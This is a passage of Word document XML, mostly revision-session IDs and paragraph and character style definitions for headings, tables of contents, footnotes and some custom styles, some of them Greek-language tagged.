    <w:rsid w:val="00EC1178"/>
    <w:rsid w:val="00EC14AB"/>
    <w:rsid w:val="00EC28DB"/>
    <w:rsid w:val="00EC474E"/>
    <w:rsid w:val="00EC4BCB"/>
    <w:rsid w:val="00EC5385"/>
    <w:rsid w:val="00EC7FBC"/>
    <w:rsid w:val="00ED2DBD"/>
    <w:rsid w:val="00ED3686"/>
    <w:rsid w:val="00ED763A"/>
    <w:rsid w:val="00EE6671"/>
    <w:rsid w:val="00EF0714"/>
    <w:rsid w:val="00EF4107"/>
    <w:rsid w:val="00EF49B4"/>
    <w:rsid w:val="00EF6129"/>
    <w:rsid w:val="00EF6A0C"/>
    <w:rsid w:val="00EF777A"/>
    <w:rsid w:val="00F01944"/>
    <w:rsid w:val="00F01C6A"/>
    <w:rsid w:val="00F02E80"/>
    <w:rsid w:val="00F04670"/>
    <w:rsid w:val="00F05903"/>
    <w:rsid w:val="00F05E77"/>
    <w:rsid w:val="00F10931"/>
    <w:rsid w:val="00F10BEF"/>
    <w:rsid w:val="00F11ACC"/>
    <w:rsid w:val="00F15070"/>
    <w:rsid w:val="00F17E5D"/>
    <w:rsid w:val="00F2079A"/>
    <w:rsid w:val="00F22151"/>
    <w:rsid w:val="00F221B0"/>
    <w:rsid w:val="00F243DA"/>
    <w:rsid w:val="00F25343"/>
    <w:rsid w:val="00F2536A"/>
    <w:rsid w:val="00F25C20"/>
    <w:rsid w:val="00F269BB"/>
    <w:rsid w:val="00F27FB3"/>
    <w:rsid w:val="00F32099"/>
    <w:rsid w:val="00F368C9"/>
    <w:rsid w:val="00F46002"/>
    <w:rsid w:val="00F5157C"/>
    <w:rsid w:val="00F52694"/>
    <w:rsid w:val="00F5383F"/>
    <w:rsid w:val="00F55802"/>
    <w:rsid w:val="00F6456D"/>
    <w:rsid w:val="00F66EC0"/>
    <w:rsid w:val="00F6765C"/>
    <w:rsid w:val="00F70063"/>
    <w:rsid w:val="00F7062D"/>
    <w:rsid w:val="00F71254"/>
    <w:rsid w:val="00F72B79"/>
    <w:rsid w:val="00F73DB7"/>
    <w:rsid w:val="00F740A8"/>
    <w:rsid w:val="00F75FC6"/>
    <w:rsid w:val="00F80C2F"/>
    <w:rsid w:val="00F82864"/>
    <w:rsid w:val="00F84776"/>
    <w:rsid w:val="00F86286"/>
    <w:rsid w:val="00F86A9D"/>
    <w:rsid w:val="00F91745"/>
    <w:rsid w:val="00F94662"/>
    <w:rsid w:val="00F96CCE"/>
    <w:rsid w:val="00F97466"/>
    <w:rsid w:val="00FA0458"/>
    <w:rsid w:val="00FA3FBA"/>
    <w:rsid w:val="00FA4347"/>
    <w:rsid w:val="00FA61A8"/>
    <w:rsid w:val="00FA73F1"/>
    <w:rsid w:val="00FA79D4"/>
    <w:rsid w:val="00FB0E24"/>
    <w:rsid w:val="00FB1166"/>
    <w:rsid w:val="00FB3094"/>
    <w:rsid w:val="00FB5C0B"/>
    <w:rsid w:val="00FB6AA0"/>
    <w:rsid w:val="00FB7022"/>
    <w:rsid w:val="00FC00EC"/>
    <w:rsid w:val="00FC1E03"/>
    <w:rsid w:val="00FC3686"/>
    <w:rsid w:val="00FC5D41"/>
    <w:rsid w:val="00FC6774"/>
    <w:rsid w:val="00FD0526"/>
    <w:rsid w:val="00FD75EC"/>
    <w:rsid w:val="00FD7D78"/>
    <w:rsid w:val="00FE1230"/>
    <w:rsid w:val="00FE25D7"/>
    <w:rsid w:val="00FE2989"/>
    <w:rsid w:val="00FE3FC6"/>
    <w:rsid w:val="00FE4661"/>
    <w:rsid w:val="00FE696C"/>
    <w:rsid w:val="00FE743C"/>
    <w:rsid w:val="00FF0387"/>
    <w:rsid w:val="00FF1785"/>
    <w:rsid w:val="00FF3F71"/>
    <w:rsid w:val="00FF5199"/>
    <w:rsid w:val="00FF5921"/>
    <w:rsid w:val="00FF5D68"/>
    <w:rsid w:val="00FF6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B00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200883"/>
    <w:pPr>
      <w:spacing w:before="120" w:after="120" w:line="360" w:lineRule="auto"/>
      <w:jc w:val="both"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading1">
    <w:name w:val="heading 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading1Char"/>
    <w:uiPriority w:val="9"/>
    <w:qFormat/>
    <w:rsid w:val="000C4765"/>
    <w:pPr>
      <w:keepNext/>
      <w:numPr>
        <w:numId w:val="2"/>
      </w:numPr>
      <w:spacing w:before="0" w:after="240" w:line="240" w:lineRule="auto"/>
      <w:jc w:val="center"/>
      <w:outlineLvl w:val="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:b/>
      <w:kern w:val="32"/>
      <w:sz w:val="28"/>
      <w:szCs w:val="28"/>
      <w:lang w:bidi="he-IL"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading2">
    <w:name w:val="heading 2"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading2Char"/>
    <w:uiPriority w:val="9"/>
    <w:qFormat/>
    <w:rsid w:val="006354D3"/>
    <w:pPr>
      <w:keepNext/>
      <w:numPr>
        <w:ilvl w:val="1"/>
        <w:numId w:val="2"/>
      </w:numPr>
      <w:spacing w:before="240" w:after="60"/>
      <w:outlineLvl w:val="1"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:b/>
      <w:bCs/>
      <w:iCs/>
      <w:szCs w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading3">
    <w:name w:val="heading 3"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading3Char"/>
    <w:uiPriority w:val="9"/>
    <w:qFormat/>
    <w:rsid w:val="007524B3"/>
    <w:pPr>
      <w:keepNext/>
      <w:numPr>
        <w:ilvl w:val="2"/>
        <w:numId w:val="2"/>
      </w:numPr>
      <w:spacing w:before="240" w:after="60"/>
      <w:outlineLvl w:val="2"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:b/>
      <w:bCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading4">
    <w:name w:val="heading 4"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading4Char"/>
    <w:uiPriority w:val="9"/>
    <w:qFormat/>
    <w:rsid w:val="003F0CC3"/>
    <w:pPr>
      <w:keepNext/>
      <w:numPr>
        <w:ilvl w:val="3"/>
        <w:numId w:val="2"/>
      </w:numPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      <w:jc w:val="center"/>
      <w:outlineLvl w:val="3"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman"/>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
      <w:lang w:bidi="he-IL"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading5">
    <w:name w:val="heading 5"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading5Char"/>
    <w:uiPriority w:val="9"/>
    <w:qFormat/>
    <w:rsid w:val="001E0CF4"/>
    <w:pPr>
      <w:numPr>
        <w:ilvl w:val="4"/>
        <w:numId w:val="2"/>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qFormat/>
    <w:rsid w:val="001E0CF4"/>
    <w:pPr>
      <w:numPr>
        <w:ilvl w:val="5"/>
        <w:numId w:val="2"/>
      </w:num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uiPriority w:val="9"/>
    <w:qFormat/>
    <w:rsid w:val="003F0CC3"/>
    <w:pPr>
      <w:keepNext/>
      <w:numPr>
        <w:ilvl w:val="6"/>
        <w:numId w:val="2"/>
      </w:numPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      <w:outlineLvl w:val="6"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman"/>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
      <w:lang w:bidi="he-IL"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading8">
    <w:name w:val="heading 8"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading8Char"/>
    <w:uiPriority w:val="9"/>
    <w:qFormat/>
    <w:rsid w:val="001E0CF4"/>
    <w:pPr>
      <w:numPr>
        <w:ilvl w:val="7"/>
        <w:numId w:val="2"/>
      </w:numPr>
      <w:spacing w:before="240" w:after="60"/>
      <w:outlineLvl w:val="7"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:eastAsia="Times New Roman" w:hAnsi="Calibri" w:cs="Times New Roman"/>
      <w:i/>
      <w:iCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading9">
    <w:name w:val="heading 9"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading9Char"/>
    <w:uiPriority w:val="9"/>
    <w:qFormat/>
    <w:rsid w:val="001E0CF4"/>
    <w:pPr>
      <w:numPr>
        <w:ilvl w:val="8"/>
        <w:numId w:val="2"/>
      </w:num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F1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9272CC"/>
    <w:rPr>
      <w:color w:val="0000FF"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading1Char">
    <w:name w:val="Heading 1 Char"/>
    <w:link w:val="Heading1"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="000C4765"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
      <w:b/>
      <w:kern w:val="32"/>
      <w:sz w:val="28"/>
      <w:szCs w:val="28"/>
      <w:lang w:val="el-GR" w:bidi="he-IL"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading4Char">
    <w:name w:val="Heading 4 Char"/>
    <w:link w:val="Heading4"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="003F0CC3"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Arial"/>
      <w:b/>
      <w:bCs/>
      <w:lang w:val="el-GR" w:bidi="he-IL"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading7Char">
    <w:name w:val="Heading 7 Char"/>
    <w:link w:val="Heading7"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="003F0CC3"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Arial"/>
      <w:b/>
      <w:bCs/>
      <w:lang w:val="el-GR" w:bidi="he-IL"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Header">
    <w:name w:val="header"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="HeaderChar"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00EC474E"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="center" w:pos="4320"/>
        <w:tab w:val="right" w:pos="8640"/>
      </w:tabs>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="HeaderChar">
    <w:name w:val="Header Char"/>
    <w:link w:val="Header"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00EC474E"/>
    <w:rPr>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Footer">
    <w:name w:val="footer"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="FooterChar"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00EC474E"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="center" w:pos="4320"/>
        <w:tab w:val="right" w:pos="8640"/>
      </w:tabs>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="FooterChar">
    <w:name w:val="Footer Char"/>
    <w:link w:val="Footer"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00EC474E"/>
    <w:rPr>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Default">
    <w:name w:val="Default"/>
    <w:rsid w:val="00B36368"/>
    <w:pPr>
      <w:widowControl w:val="0"/>
      <w:autoSpaceDE w:val="0"/>
      <w:autoSpaceDN w:val="0"/>
      <w:adjustRightInd w:val="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman"/>
      <w:color w:val="000000"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="CM31">
    <w:name w:val="CM31"/>
    <w:basedOn w:val="Default"/>
    <w:next w:val="Default"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00165B67"/>
    <w:rPr>
      <w:color w:val="auto"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="CM30">
    <w:name w:val="CM30"/>
    <w:basedOn w:val="Default"/>
    <w:next w:val="Default"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00165B67"/>
    <w:rPr>
      <w:color w:val="auto"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="CM33">
    <w:name w:val="CM33"/>
    <w:basedOn w:val="Default"/>
    <w:next w:val="Default"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00961AD7"/>
    <w:rPr>
      <w:color w:val="auto"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="CM35">
    <w:name w:val="CM35"/>
    <w:basedOn w:val="Default"/>
    <w:next w:val="Default"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00961AD7"/>
    <w:rPr>
      <w:color w:val="auto"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="CM19">
    <w:name w:val="CM19"/>
    <w:basedOn w:val="Default"/>
    <w:next w:val="Default"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00961AD7"/>
    <w:pPr>
      <w:spacing w:line="413" w:lineRule="atLeast"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="auto"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="CM41">
    <w:name w:val="CM41"/>
    <w:basedOn w:val="Default"/>
    <w:next w:val="Default"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00961AD7"/>
    <w:rPr>
      <w:color w:val="auto"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="CM44">
    <w:name w:val="CM44"/>
    <w:basedOn w:val="Default"/>
    <w:next w:val="Default"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00961AD7"/>
    <w:rPr>
      <w:color w:val="auto"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="BalloonText">
    <w:name w:val="Balloon Text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="BalloonTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="001C783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C7838"/>
    <w:rPr>
      <w:rFonts w:ascii="Tahoma" w:hAnsi="Tahoma" w:cs="Tahoma"/>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading2Char">
    <w:name w:val="Heading 2 Char"/>
    <w:link w:val="Heading2"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="006354D3"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
      <w:b/>
      <w:bCs/>
      <w:iCs/>
      <w:sz w:val="24"/>
      <w:szCs w:val="28"/>
      <w:lang w:val="el-GR"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading3Char">
    <w:name w:val="Heading 3 Char"/>
    <w:link w:val="Heading3"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="007524B3"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
      <w:lang w:val="el-GR"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading5Char">
    <w:name w:val="Heading 5 Char"/>
    <w:link w:val="Heading5"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="001E0CF4"/>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:b/>
      <w:bCs/>
      <w:i/>
      <w:iCs/>
      <w:sz w:val="26"/>
      <w:szCs w:val="26"/>
      <w:lang w:val="el-GR"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading6Char">
    <w:name w:val="Heading 6 Char"/>
    <w:link w:val="Heading6"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="001E0CF4"/>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
      <w:lang w:val="el-GR"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading8Char">
    <w:name w:val="Heading 8 Char"/>
    <w:link w:val="Heading8"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="001E0CF4"/>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:i/>
      <w:iCs/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
      <w:lang w:val="el-GR"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading9Char">
    <w:name w:val="Heading 9 Char"/>
    <w:link w:val="Heading9"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="001E0CF4"/>
    <w:rPr>
      <w:rFonts w:ascii="Cambria" w:eastAsia="Times New Roman" w:hAnsi="Cambria"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
      <w:lang w:val="el-GR"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListParagraph">
    <w:name w:val="List Paragraph"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="34"/>
    <w:qFormat/>
    <w:rsid w:val="00EF777A"/>
    <w:pPr>
      <w:ind w:left="720"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOCHeading">
    <w:name w:val="TOC Heading"/>
    <w:basedOn w:val="Heading1"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="39"/>
    <w:qFormat/>
    <w:rsid w:val="004C2152"/>
    <w:pPr>
      <w:keepLines/>
      <w:numPr>
        <w:numId w:val="0"/>
      </w:numPr>
      <w:spacing w:before="480" w:after="0"/>
      <w:jc w:val="left"/>
      <w:outlineLvl w:val="9"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria" w:cs="Times New Roman"/>
      <w:bCs/>
      <w:color w:val="365F91"/>
      <w:lang w:bidi="ar-SA"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC1">
    <w:name w:val="toc 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="004C2152"/>
    <w:pPr>
      <w:spacing w:before="360" w:after="0"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
      <w:b/>
      <w:bCs/>
      <w:caps/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC2">
    <w:name w:val="toc 2"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="004C2152"/>
    <w:pPr>
      <w:spacing w:before="240" w:after="0"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC3">
    <w:name w:val="toc 3"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="004C2152"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0"/>
      <w:ind w:left="240"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="PEGGY">
    <w:name w:val="PEGGY"/>
    <w:basedOn w:val="Heading1"/>
    <w:link w:val="PEGGYChar"/>
    <w:qFormat/>
    <w:rsid w:val="00B1709A"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="0"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Caption">
    <w:name w:val="caption"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="35"/>
    <w:qFormat/>
    <w:rsid w:val="00215036"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="PEGGYChar">
    <w:name w:val="PEGGY Char"/>
    <w:basedOn w:val="Heading1Char"/>
    <w:link w:val="PEGGY"/>
    <w:rsid w:val="004C2EF0"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
      <w:b/>
      <w:kern w:val="32"/>
      <w:sz w:val="28"/>
      <w:szCs w:val="28"/>
      <w:lang w:val="el-GR" w:bidi="he-IL"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TableofFigures">
    <w:name w:val="table of figures"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="0036629B"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="FootnoteText">
    <w:name w:val="footnote text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="FootnoteTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="007E6FEF"/>
    <w:rPr>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="FootnoteTextChar">
    <w:name w:val="Footnote Text Char"/>
    <w:link w:val="FootnoteText"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="007E6FEF"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:lang w:val="el-GR"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="FootnoteReference">
    <w:name w:val="footnote reference"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="007E6FEF"/>
    <w:rPr>
      <w:vertAlign w:val="superscript"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC4">
    <w:name w:val="toc 4"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="003B0BB2"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0"/>
      <w:ind w:left="480"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC5">
    <w:name w:val="toc 5"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="003B0BB2"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0"/>
      <w:ind w:left="720"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC6">
    <w:name w:val="toc 6"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="003B0BB2"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0"/>
      <w:ind w:left="960"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC7">
    <w:name w:val="toc 7"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="003B0BB2"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0"/>
      <w:ind w:left="1200"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC8">
    <w:name w:val="toc 8"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="003B0BB2"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0"/>
      <w:ind w:left="1440"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC9">
    <w:name w:val="toc 9"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="003B0BB2"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0"/>
      <w:ind w:left="1680"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Style1">
    <w:name w:val="Style1"/>
    <w:basedOn w:val="Heading2"/>
    <w:link w:val="Style1Char"/>
    <w:qFormat/>
    <w:rsid w:val="00BC6AE0"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="120" w:line="240" w:lineRule="auto"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:styleId="FollowedHyperlink">
    <w:name w:val="FollowedHyperlink"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00666F08"/>
    <w:rPr>
      <w:color w:val="800080"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Style1Char">
    <w:name w:val="Style1 Char"/>
    <w:basedOn w:val="Heading2Char"/>
    <w:link w:val="Style1"/>
    <w:rsid w:val="00BC6AE0"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
      <w:b/>
      <w:bCs/>
      <w:iCs/>
      <w:sz w:val="24"/>
      <w:szCs w:val="28"/>
      <w:lang w:val="el-GR"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="shorttext">
    <w:name w:val="short_text"/>
    <w:rsid w:val="0096360A"/>
  </w:style>
